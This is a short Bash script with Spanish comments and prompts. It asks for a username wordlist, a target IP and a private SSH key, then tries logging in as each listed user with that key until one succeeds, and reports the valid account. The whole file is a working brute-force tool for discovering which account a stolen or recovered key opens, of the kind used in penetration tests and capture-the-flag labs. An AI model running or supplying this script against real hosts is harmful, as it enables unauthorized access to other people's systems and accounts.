#!/bin/bash

# Colores para salida
RED="\e[91m"
GREEN="\e[92m"
WHITE="\e[97m"

# Solicita la ruta del diccionario, la IP y la ruta de la clave privada
read -p "Ingrese la ruta absoluta del diccionario de usuarios: " DICTIONARY_PATH
read -p "Ingrese la IP del host remoto: " RHOST
read -p "Ingrese la ruta absoluta de la clave privada id_rsa: " KEY_PATH

# Verifica que el diccionario y la clave privada existan
if [ ! -f "$DICTIONARY_PATH" ]; then
  echo -e "$RED[!] Diccionario no encontrado en $DICTIONARY_PATH"
  exit 1
fi

if [ ! -f "$KEY_PATH" ]; then
  echo -e "$RED[!] Clave privada no encontrada en $KEY_PATH"
  exit 1
fi

# Ajusta los permisos de la clave privada a 600
chmod 600 "$KEY_PATH"

# Carga los usuarios desde el diccionario
USERS=$(<"$DICTIONARY_PATH")

# Prueba cada usuario
for USER in $USERS; do
  ssh -o BatchMode=yes -i "$KEY_PATH" "$USER@$RHOST" -x id &>/dev/null
  if [ $? -eq 0 ]; then
    echo -e "$GREEN[+] Usuario $USER es válido"
    exit 0
  else
    echo -e "$RED[-]$WHITE Usuario $USER es inválido"
  fi
done
